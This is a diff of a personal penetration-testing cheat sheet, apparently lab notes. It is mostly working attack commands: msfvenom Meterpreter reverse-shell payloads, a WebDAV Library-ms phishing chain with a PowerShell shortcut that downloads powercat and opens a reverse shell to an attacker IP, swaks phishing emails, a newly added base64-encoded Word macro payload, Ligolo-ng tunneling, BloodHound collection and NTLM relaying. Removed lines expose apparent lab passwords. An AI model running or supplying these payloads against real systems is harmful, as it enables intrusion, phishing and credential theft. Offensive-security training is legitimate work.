@@ -1,17 +1,15 @@
 ---
 
 ---
--------
 # Remote Connection
 
 --------
 ## xfreerdp
 
 ```bash
-xfreerdp /u:jeff /p:'HenchmanPutridBonbon11' -f /v:192.168.211.75 -grab-keyboard
+xfreerdp /u:<user> /p:'<pass>' /v:<ip> -f -grab-keyboard
 ```
 
------
 # Metasploit
 
 -----
@@ -29,11 +27,9 @@ msfconsole -q -x 'use exploit/multi/handler;set LHOST tun0;set PAYLOAD windows/x
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > backup.exe
 ```
 
---------
 # Phishing
 
 --------
-
 ## WebDav
 
 **1. Create local handler**
@@ -59,7 +55,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > bac
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://192.168.45.215</url>
+<url>http://192.168.45.247</url>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
@@ -69,7 +65,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > bac
 **3. Create shortcut** (change IP)
 
 ```js
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.215:8000/powercat.ps1'); powercat -c 192.168.45.215 -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.247:8000/powercat.ps1'); powercat -c 192.168.45.247 -p 4444 -e powershell"
 ```
 
 **4. Transfer to Kali**
@@ -88,14 +84,27 @@ python3 -m http.server 8000
 **(Optional) 6. Send via email**
 
 ```bash
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.210.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.210.242 --body @body.txt --header "Subject: Very real email please open" --suppress-data -ap
 ```
 
-------
+## Macro
+
+1. Create Word/Excel-97 compatible doc
+2. `view` > `macros`
+
+```powershell
+$Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.193/powercat.ps1");powercat -c 192.168.45.193 -p 443 -e powershell'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+$EncodedText =[Convert]::ToBase64String($Bytes)
+
+$EncodedText
+```
+
 ## Tunneling
 
 -------
-
 ## Ligolo-ng
 
 **Set up**
@@ -119,8 +128,12 @@ sudo ip link set ligolo up
 sudo ip route add 192.168.96.0/24 dev ligolo
 ```
 
+**Add listener (in this case for responder)**
 
------
+```
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:445 --tcp
+listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+```
 # Bloodhound
 
 -------
@@ -132,14 +145,13 @@ dnschef --fakeip <DC IP>
 ```
 
 ```bash
-bloodhound-python -c all -u john -p 'dqsTwTpZPn#nL' -d beyond.com -dc dcsrv1 -ns 127.0.0.1 --zip --dns-timeout 30
+bloodhound-python -c all -u <user> -p '<pass>' -d <domain> -dc <FQDN> -ns 127.0.0.1 --zip --dns-timeout 30
 ```
 
 > [!info] DNSChef fixes a DNS timeout problem which can occur with bloodhound.py 
 > 
 > (often occurs when tunneling DNS, idk why)
 
-------
 # Relaying
 
 --------
@@ -154,7 +166,11 @@ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.210.242 -e bac
 > 
 > Anywhere you can force a Windows machine to make a connection can potentially be used for relaying. The connection and service type doesn't matter (could be SMB, HTTP, MSSQL etc). Relaying can be used for code execution, priv esc, or info leak, try everything.
 
+# Rustscan
 
+-----
 
-
+```bash
+sudo rustscan <IP> -- -A -sCV -oA <outfile>
+```
 
